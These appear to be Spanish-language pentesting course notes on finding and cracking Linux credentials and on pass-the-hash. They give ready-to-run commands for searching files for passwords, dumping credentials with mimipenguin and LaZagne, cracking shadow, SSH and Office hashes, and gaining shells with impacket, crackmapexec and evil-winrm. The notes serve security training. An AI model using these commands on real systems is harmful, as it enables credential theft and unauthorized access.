
###BUSCAR CONTRASEÑAS EN LINUX
Las contraseñas pueden encontrarse en archivos, memoria, y key rings. El segundo hace referencia a registros, procesos y el ultimo a creds almacenadas en navegador.
En linux todo es un archivo, por lo cual es importante enumerar los de configuracion, base de datos (cronjobs) y de texto para encontrar algo.

	##Archivos de CONFiguracion
	for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
	#De esta forma buscamos archivos tipo .conf .config, etc gracias a pasarle el parametro al find
	for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
	#En cada archivo .cnf se busca la palabra user password o pass

	##Archivos BASE DE DATOS
	for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
	#Se busca los archivos .sql, .ddbb, etc

	##Archivos de TXT
	find /home/* -type f -name "*.txt" -o ! -name "*.*"
	#Muchas veces no siempre los archivos de texto poseen el .txt. Por este motivo se debe buscar la extension y archivos sin extencion.

	##Archivos SCRIPT
	for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
	#Al igual que lo anterior se buscan archivos con extencion segun lo que buscamos. En este caso: .py, .go, etc

	##CRONJOB
	Son ejecuciones de comandos programados y se encuentran en /etc/crontab. Algunos script requieren contraseñas para ejecutarese y puede haber alguna en estos archivos.
	Puede haber cron.daily, etc dependiendo la frecuencia.
	Distros debian: /etc/cron.d

	##CLAVES SSH
	grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
	grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
	#Dado que las claves ssh pueden nombrarse de distinta forma, es conveniente intentar buscar por el comienzo de la private que es siempre igual.

	##Archivo HISTORIAL BASH
	El archivo bash history es el historial de todos los comandos utilizados en la terminal bash. Se puede catear

	##REGISTROS
	Los archivos de registros se almacenan en /var/log/*. Aca se puede encontrar info de los registros.
	for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

	##Archivos de MEMORIA y CACHE
	Muchas veces las credenciales para reutilizarlas se almacenan en archivos que pueden ser leidos. Para ello una herramienta llamada mimipenguin puede sernos de utilidad
	Requiere privilegios root!

	sudo python3 mimipenguin.py
	sudo bash mimipenguin.sh 

	Lazagne tambien puede servirnos en Linux
	sudo python2.7 laZagne.py all

	##NAVEGADORES
	Las credenciales de FIREFOX son almacenadas en logins.json encriptadas.
	ls -l .mozilla/firefox/ | grep default 
	#Busco carpeta contenedora de archvio .json
	cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
	#Leo el interior del archivo buscado

	python3.9 firefox_decrypt.py
	#Con Firefoxdecrypt podemos desencriptar estas contraseñas.

	python3 laZagne.py browsers
	#Lazagne tambien tiene su version para browsers

###AUTENTICACION
La autenticacion en Linux se realiza con los modulos PAM. Adminitra informacion de usuario, autenticacion, sesiones, contraseñas actuales y antiguas.

	##/etc/passwd
	Cada entrada en el archivo corresponde a un usuario. Esta compuesto por campos separados mediante ":"
	
	usr : password : UID :: GUID : nombre completo : directorio : shell
	#Si en el campo de la contraseña se encuentra un X quiere decir que el hash es almacenado en /etc/shadow
	#Si el posible editar el etc/passwd y se borra la x de root, podriamos ejecutar todo como root sin necesidad de password.
	
	##/etc/shadow
	No maneja las contraseñas sino que solo almacena el hash. En el caso de que no haya entrada en este archivo para un usr que se encuentra en passwd, este usuario se considera invalido
	Solo puede ser leido y manipulado con acceso root.
	
	usr : contraseña encriptada : ult modif : min passw age : max passw age : warning perod : inactivity period : vencimmiento : unused
	#En el caso de que la contraseña aparezca como ! o * el usr no se puede loguear con contraseña UNIX. Pude haber otros metodos de logg como kerberos o key-based.
	#Si el field de la passwd esta vacio quiere decir que no se requiere password para loguearse como el objetivo.

	##/etc/security/opasswd
	La libreria PAM puede prevenir el reuso de contraseñas antiguas. En este directorio es donde se almacenan y se requiere acceso como administrador para manipular el archivo.
	
	
	##CRAKCIN hashes
	unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
	#Creamos unshadow para poder pasarle a hashcat o john
	hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
	#Crackeamos el hash con rockyou list

###ARCHIVOS PROTEGIDOS
	##SSH
	Si encontramos una private key, por lo general suelen tener una contraseña. Muchas veces esta contraseña es debil por la confianza en SSH.
	ssh2john.py SSH.private > ssh.hash
	#Obtenemos el hash de la private para romperlo
	john --wordlist=rockyou.txt ssh.hash
	#Intentamos rommper el hash mediante un diccionario

	##DOCUMENTOS
	Los documentos de office tambien tiene contraseña
	office2john.py Protected.docx > protected-docx.hash
	#De esta forma intentamos obbtener el hash para intentar romperlo
	john --wordlist=rockyou.txt protected-docx.hash
	#Igual que antes, de esta forma buscamos romper el hash
	
	##PDF
	pdf2john.py PDF.pdf > pdf.hash
	#El resto es igual...
	
	Lo mas complicado va a seguir siendo la creacion de listas mutadas para poder decifrar con exito el hash.	

	#IMPORTANTE
	John tiene muchas archivos mas para obtener hash e intentar romperlos. Algunos otros puede ser los zip.

	##OpenSSL
	for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
	#Puesto que decifrar openssl puede arrojar falsos positivos, un for es la mejor opcion

	
###PASS THE HASH
	##      Definiciones    ##
	PTH es una tecnica en donde un atacante no necesita la contrase;a para loguearse sino simplemente el hash de la misma.
	
	## PTH with Impacket PsExec
	impacket-psexec <user>@<target ip> -hashes :<hash>
	#Ademas de este existe: impacket-wmiexec; impacket-atexec y impacket-smbexec que pueden usarse de la misma forma

	## PTH with CrackMapExec
	crackmapexec smb 172.16.1.0/24 -u Administrator -d <dominio> -H <hash>
	#Para verificar en un rango de ip's a donde podemos conectarnos con el hash que encontramos
	crackmapexec smb 10.129.201.126 -u Administrator -d <dominio> -H <hash> -x <command>
	#Una vez encontrado una ip con la que podamos conectarnos, podemos ejecutar comandos con -x

	## PTH with evil-winrm
	evil-winrm -i <target ip> -u <usuario> -H <hash>
	#Obtenemos una shell si todo es correcto
	
	## PTH with RDP
	Pueden darse errores al tener que conectarse. Mas info: https://academy.hackthebox.com/module/147/section/1638
	
	xfreerdp  /v:<target ip> /u:<usuario> /pth:<hash>
	#Coneccion mediante RDP con el hash
